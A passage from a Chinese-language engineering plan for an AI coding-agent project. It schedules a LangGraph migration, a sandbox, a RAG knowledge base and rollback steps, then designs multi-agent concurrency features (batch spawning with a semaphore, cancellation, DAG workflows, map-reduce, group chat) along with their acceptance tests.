   - Day 5：LangGraphAgentLoop 四节点图（chat_node/tools_node/compact_node/END）+ after_chat 条件边（95% 代码从旧 while 循环拷贝）+ 防 GraphRecursionError 双保险（recursion_limit=128 + state._last_tool_call_ids 幂等）
   - Day 6：SqliteSaver checkpointer 接入 + list_checkpoints/rollback_to_checkpoint/create_branch_from_checkpoint 三个 UI 工具；UT：简单对话 5 轮工具 + 1 次 compact，**两个引擎的 messages 数组字节级相等**（thinking block 随机内容除外）
5. **Day 7 ~ Day 9**：S8.3 沙箱系统（此时 LangGraph interrupt_before 已经接好，HITL 审批直接复用原生中断省 200 行）
   - Day 7：SandboxConfig + 路径白名单/网络开关/命令黑名单/资源限制 + NativeSandbox + TempdirSandbox（Windows 默认后端，不卡 Docker）
   - Day 8：BashTool + 所有 FS 工具统一注入沙箱，path_is_allowed() 前置校验；沙箱黑名单直接报错，不进审批弹窗（防重复打扰）
   - Day 9：DockerSandbox 可选后端（显式开启，`docker info` 探测失败就降级） + 8 个安全 UT 全部通过（每个都断言越权操作**真的失败**，反向证明沙箱生效）
6. **Day 10 ~ Day 13**：S8.4 RAG 知识库
   - Day 10-11：DocumentChunker 三分块策略（Python AST/Markdown 标题层级/纯文本滑动窗口）+ 每个 chunk 注入 header_context（函数签名/标题路径）
   - Day 11-12：EmbeddingProvider（复用现有 httpx 客户端，OpenAI 兼容端点）+ FAISSVectorStore + Chroma 可选抽象 + 本地 embedding 缓存 + 429 重试
   - Day 12-13：KnowledgeIndexManager 目录递归索引 + 增量更新（按 mtime） + search_knowledge/index_knowledge/forget_knowledge 三个 Agent 工具 + SystemPrompt 追加 RAG 行为引导 + 10 查 9 中 E2E
7. **Day 14**：全量集成测试（30 轮真实对话覆盖所有 builtin 工具）+ bug 修复 + RUNBOOK/配置项文档补全

> 回滚策略（1 分钟还原）：
> - LangGraph 迁坏了：config.agent.engine = "legacy"（默认本来就是）+ 不 import langgraph 三依赖，完全回到迁之前的状态
> - 沙箱影响现有工具：构造工具时不传 sandbox 参数，回到直调 subprocess/直调 pathlib 的旧代码路径
> - 快照占空间：手动 `rm -rf .iwan/snapshots/*`，不影响任何其他功能

### ✅ 用户已确认的两个决策（开工不再变更，避免返工）

| 决策点 | 已选方案 | 备注 |
|---|---|---|
| **1. 回溯快照占用空间策略** | 选项 B：只保留最近 **30 个**（LRU 自动清旧的）+ **bash 默认也打 CWD 全量快照**（硬链接去重后实际占用远低于标称） | 你说"我们只是做功能，bash 改的东西也要能回溯" — 采纳；30 个兼顾学习体验和空间 |
| **2. LangGraph 和沙箱的顺序** | 选项 B：**先迁 LangGraph（Day 4~6），再做沙箱（Day 7~9）**，RAG 最后 | 你说"这是学习项目，我要先学主流做 agent 的框架" — 采纳；沙箱 interrupt 还能复用 LangGraph 原生 HITL 省 200 行 |

**最终计划已冻结并写入计划书，确认无误即可直接开工！**

---

## 十五、S9 阶段：Agent 并发集群与编排能力升级

> 对应新增需求：**"别人有 agent 集群，可以并行/串行执行 agent，我们只能父 agent 调子 agent，不能真正并发"**
> 结论前置：S7 已具备"单任务后台并行 + 手动轮询"的基础能力（`spawn_agent(background=true)` + `agent_result`），但缺少**批量编排级原语**。S9 分三档补齐：**阶段 A（基础并发加固·1~2 天，解决 80% 场景）→ 阶段 B（DAG 编排·3~4 天）→ 阶段 C（真正集群·5~7 天，学习深入用）**。

---

### 15.1 现状基线：有什么？缺什么？

| 能力 | 当前实现状态 | 差距 |
|---|---|---|
| **前台阻塞调用子 agent** | ✅ `spawn_agent(run_in_background=false)` | OK |
| **单任务后台并行 + 手动轮询** | ✅ `spawn_agent(background=true)` 返回 run_id；`agent_result(run_id)` 轮询 | 只能 1 个 1 个来，批量 5 个任务要手动调 5 次 spawn + 5 次轮询 |
| **2 层嵌套 + 角色隔离** | ✅ `depth` 参数 + `subagent_type` profile | OK |
| **后台任务注册表** | ⚠️ 只有 `register/get/all` 三个方法 | ❌ 没有 cancel/超时/TTL 清理 → 挂了的任务内存泄漏；registry 越跑越大 |
| **批量并发启动** | ❌ 无 | ❌ 没有 `spawn_N_tasks_and_wait` 工具；没有并发数上限（一下子 spawn 20 个 → 打爆 API 429） |
| **Map-Reduce / 分治聚合** | ❌ 无 | ❌ "拆分→N 个并行跑→聚合结果" 最常见模式全手写 |
| **DAG 有向无环图依赖** | ❌ 无 | ❌ "先跑 A，A 完了 B/C 同时跑，B/C 都好 D 才开始" 这种依赖全手写 |
| **取消 / 超时控制** | ❌ 无 | ❌ 某子 agent 死循环跑 1 小时没人管；用户想取消只能关进程 |
| **子 agent 工作目录隔离** | ❌ 所有子 agent 共享同一个 cwd | ❌ 并行写文件会互相踩！写 a.py 和写 a.py 的两个 agent 同时写 → 乱成一团 |
| **多 agent 对等讨论 / 消息总线** | ❌ 只有"父调子"的层级关系 | ❌ 没有 AutoGen 风格的 GroupChat + 多 agent 协商 |
| **进程级故障隔离** | ❌ 所有 agent 同进程同 event loop | ❌ 一个 agent 死循环/内存爆 → 全家一起死 |
| **跨机器分布式队列** | ❌ 全进程内内存 registry | ❌ 不需要（学习项目可跳过） |

---

### 15.2 S9 三阶段详细设计

#### 阶段 A（S9.0）：基础并发加固（1~2 天，P0，性价比最高）

**核心交付物：3 个新工具 + BackgroundTaskRegistry 加固 + 并发控制 Semaphore + 超时/取消**

##### A1. BackgroundTaskRegistry 升级（[registry.py](file:///d:/IwanClaude/src/iwan_claude/core/subagent/registry.py)）

新增 4 个方法 + 2 个字段：

```python
class BackgroundTaskRegistry:
    def __init__(self, default_timeout_sec: int = 600, ttl_after_done_sec: int = 3600) -> None:
        self._tasks: dict[str, tuple[asyncio.Task[None], ExecutionContext]] = {}
        # 新增：batch 管理 → {batch_id: [run_id1, run_id2, ...]}
        self._batches: dict[str, list[str]] = {}
        # 新增：条目创建时间（TTL 自动清旧）
        self._created_at: dict[str, datetime] = {}
        self.default_timeout_sec = default_timeout_sec      # 单 agent 默认 10 分钟超时
        self.ttl_after_done_sec = ttl_after_done_sec        # 完成后 1 小时自动 prune

    # 取消单个
    def cancel(self, run_id: str) -> bool: ...
    # 取消整个 batch
    def cancel_batch(self, batch_id: str) -> int: ...
    # 取消所有
    def cancel_all(self) -> int: ...
    # 按 TTL 清理已完成的旧条目（防内存泄漏）
    def prune(self) -> int: ...
    # 注册 batch
    def register_batch(self, batch_id: str, run_ids: list[str]) -> None: ...
    # 查询 batch 状态快照
    def batch_status(self, batch_id: str) -> BatchStatus: ...
```

另外给 `_run_background` 包一层 `asyncio.wait_for(..., timeout=registry.default_timeout_sec)`，超时后 task.cancel() + 在 context 里标记 `status=timeout`。

##### A2. 新增工具 1：`spawn_agents`（批量并行启动）

```python
class SpawnAgentsParams(BaseModel):
    tasks: list[SpawnAgentTask]   # [{description, prompt, subagent_type?}, ...]
    max_concurrency: int = 3      # 【关键】信号量，默认最多同时 3 个，打爆 API
    wait: bool = True             # True=阻塞等全部完成返回聚合结果; False=返回 batch_id 立即
    batch_description: str = ""   # 方便 TUI 显示
```

- `wait=true`：内部用 `asyncio.Semaphore(max_concurrency)` 限流 + `asyncio.gather(*coros, return_exceptions=True)`，最后返回 `[{run_id, status, result, description}, ...]` 聚合结果
- `wait=false`：后台模式，返回 `batch_id`，用 `batch_result(batch_id=..., wait=True)` 再等

##### A3. 新增工具 2：`batch_result`

```python
class BatchResultParams(BaseModel):
    batch_id: str
    wait: bool = False            # True=阻塞直到 batch 全部完成/失败/取消; False=立即返回当前快照
    timeout: int = 0              # wait=True 时的额外等待超时；0=用默认
```

返回：
```json
{
  "batch_id": "b_xxx",
  "total": 10,
  "completed": 7,
  "running": 2,
  "failed": 1,
  "cancelled": 0,
  "duration_sec": 24.5,
  "results": [
    {"run_id": "r_aaa", "description": "分析A.py", "status": "success", "result": "...", "elapsed_sec": 12.3},
    {"run_id": "r_bbb", "description": "分析B.py", "status": "running", "result": null},
    ...
  ]
}
```

##### A4. 新增工具 3：`cancel_agent` / `cancel_batch`（二合一 cancel_tool）

```python
# 一个工具两个用法：传 run_id → 取消单个；传 batch_id → 取消整个 batch
class CancelAgentParams(BaseModel):
    run_id: str | None = None
    batch_id: str | None = None
    reason: str = "user cancelled"
```

##### A5.（可选但强烈推荐）子 agent 工作目录隔离

现在所有 subagent 共享同一个 `cwd`，并行写文件会**互相踩**。方案：

- 每个 subagent 启动时 `workdir = Path(".iwan") / "work" / run_id` → `mkdir -p`
- 内部 `monkeypatch.chdir(workdir)` 或者在构造 AgentLoop 时给工具都加 `cwd_override`
- 结束后 agent 可以调用"publish"工具（或者默认）把产出的文件 copy 回父 cwd

---

#### 阶段 B（S9.1）：DAG 工作流引擎（3~4 天，P1）

**核心交付物：声明式 DAG DSL + 拓扑排序 + 依赖传播失败 + Map-Reduce 原语**

##### B1. `declare_workflow` + `run_workflow` 两个工具

用 JSON 声明有向无环图：

```python
declare_workflow({
    "id": "wf_refactor_backend",
    "description": "后端重构全流程",
    "nodes": {
        "plan":     {"agent": "planner",  "prompt": "拆分重构任务为 5 个步骤"},
        "impl_db":  {"agent": "executor", "prompt": "改 DB schema",         "depends_on": ["plan"]},
        "impl_api": {"agent": "executor", "prompt": "改 API 层",            "depends_on": ["plan"]},
        "review":   {"agent": "reviewer", "prompt": "审查 impl_db + impl_api 结果", "depends_on": ["impl_db", "impl_api"]},
    },
    "max_concurrency": 2,
})
# 返回 workflow_id

run_workflow({
    "workflow_id": "wf_refactor_backend",
    "wait": True,
})
# 聚合返回每个节点的结果 + 整体状态
```

核心实现思路：
1. **拓扑排序** `depends_on` 建图 → Kahn 算法生成执行顺序
2. **就绪判定**：每个 node 的所有 `depends_on` parent 状态都 == "success" 才 spawn
3. **失败传播**：某 parent fail/cancel → 下游所有未开始的 node 标 `skipped`
4. **结果注入**：parent 的 tool_result 字符串会自动拼到子 node 的 prompt 开头作为上下文

##### B2. Map-Reduce 三件套原语（直接封装 spawn_agents）

```python
# Step 1: 拆分 — 用 LLM 把大任务按文件/按模块切 chunk
split = split_for_map({
    "task": "为 src/ 下所有文件加 type hint",
    "strategy": "per_file",          # per_file / per_module / llm_split
    "pattern": "**/*.py",
    "exclude": ["tests/**", "__pycache__/**"],
})
# → chunks = [{id:1, prompt:"给 a.py 加 hint"}, {id:2, ...}, ...]

# Step 2: 并行 map — 内部就是 spawn_agents(chunks, max_concurrency=4)
mapped = map_run({
    "chunks": split["chunks"],
    "max_concurrency": 4,
    "per_chunk_agent_type": "executor",
})

# Step 3: reduce 聚合 — 把 N 个 chunk 的结果扔给 1 个 reviewer/aggregator agent 做整合
final = reduce_results({
    "map_results": mapped["results"],
    "reducer_prompt": "生成整体迁移报告，按文件分类列出未覆盖的 case",
    "reducer_agent_type": "reviewer",
})
```

---

#### 阶段 C（S9.2）：真正的"Agent 集群"（5~7 天，P2，深入学习用）

##### C1. GroupChat 多 agent 对等讨论（AutoGen 风格）

不再是"父调子"的树状结构，而是 **N 个 peer agent 在消息总线上讨论，manager 决定谁下一个说话**：

```python
GroupChat({
    "agents": [
        {"name": "coder",    "type": "executor", "persona": "务实的后端工程师，写代码但不写测试"},
        {"name": "tester",   "type": "reviewer", "persona": "挑剔的 QA，coder 写完必喷漏测"},
        {"name": "product",  "type": "planner",  "persona": "产品经理，会质疑需求合理性"},
    ],
    "manager": "round_robin | llm_selector | topic_based",  # 下一个谁发言的策略
    "max_rounds": 20,
    "end_condition": "manager outputs 'CONSENSUS REACHED'",
})
```

- 每个 agent 发言时可以 `@coder` 指定别人接话
- `llm_selector` 模式下 manager 自己调 LLM 判断"现在该谁接话最合适"
- 结束条件：达到 max_rounds **或** manager 输出共识达成指令

##### C2. 进程级隔离（多进程 agent，防连带崩溃）

现有所有 subagent 跑在**同一 event loop 同进程**里 → 一个 agent 死循环（比如写了个 `while True: pass` 的 bash 命令卡死）全家一起死。方案：
- 用 `multiprocessing.Process` 把重度 subagent 启动在独立子进程
- 进程间用 `asyncio.Queue + multiprocessing.Pipe` 通信（发送 tool 调用 / 回传结果 / 发 cancel 信号）
- 子进程挂了 → 父进程收到 SIGCHLD → context.status="crashed" + 可重启

##### C3.（可选，一般不用）持久化队列 + worker 分布式

把内存里的 `BackgroundTaskRegistry` 换成 Redis/RabbitMQ 队列，启动多个 worker 进程消费 → 跨机器分布式。对学习项目来说超纲，仅作预留设计。

---

### 15.3 S9 验收标准（按阶段）

#### 阶段 A（S9.0）：12+ UT

- **BackgroundTaskRegistry 加固**（4 UT）：cancel/cancel_all/prune_TTL/超时自动 kill
- **spawn_agents + wait=True**（3 UT）：单任务 / 3 任务并发 / 10 任务 + max_concurrency=3 验证**同一时刻最多同时 3 个在跑**（用 mock provider 加 `asyncio.sleep(0.1)` 看时间窗口内的并行数）
- **batch_result**（2 UT）：wait=False 快照 + wait=True 阻塞完成
- **cancel**（2 UT）：取消单个 + 取消 batch
- **E2E 场景**：10 个 agent（每个 sleep 0.1s）+ max_concurrency=3 → 总耗时 ≥ (10/3)*0.1 ≈ 0.34s，< 串行 1.0s；如果不加 semaphore → 总耗时 ≈ 0.1s（反向证明 semaphore 真生效）

#### 阶段 B（S9.1）：8+ UT

- DAG 线性链 A→B→C：A 成功 → B spawn → B 成功 → C spawn；A fail → B/C 全 skipped
- DAG 扇入扇出：A→[B,C]→D，A 成功后 B 和 C **同时** spawn（用时间差验证），B/C 都 success 后 D spawn
- split + map_run + reduce 三段式全流程跑通 + 结果聚合正确

---

### 15.4 推荐实施顺序（和现有 S8 里程碑的衔接）

| 时间点 | 做什么 | 和 S8 的关系 |
|---|---|---|
| **现在 → Day 1.5** | **先开工 S9.0 阶段 A**（3 新工具 + Registry 加固 + Semaphore + 超时/取消） | 和 S8 完全独立（只改 `subagent/tool.py` + `subagent/registry.py` + 注册 + UT），不碰 editor/沙箱/RAG |
| S8.2 LangGraph 迁完后 | S9.1 DAG 阶段 B | 迁完 LangGraph 后 DAG 可以用 `Send()` API 原生实现，比手写更省代码 |
| 学习需要深入时 | S9.2 阶段 C（GroupChat + 多进程） | 纯学习项，不影响生产可用体验 |

**✅ 现在立刻开工 S9.0 阶段 A！** 工期 1~2 天，第二天你就能体验"用 1 个 `spawn_agents(tasks=5个分析任务, max_concurrency=3)` 命令一次性跑 5 个子 agent，而且不会打爆 API"的快乐。
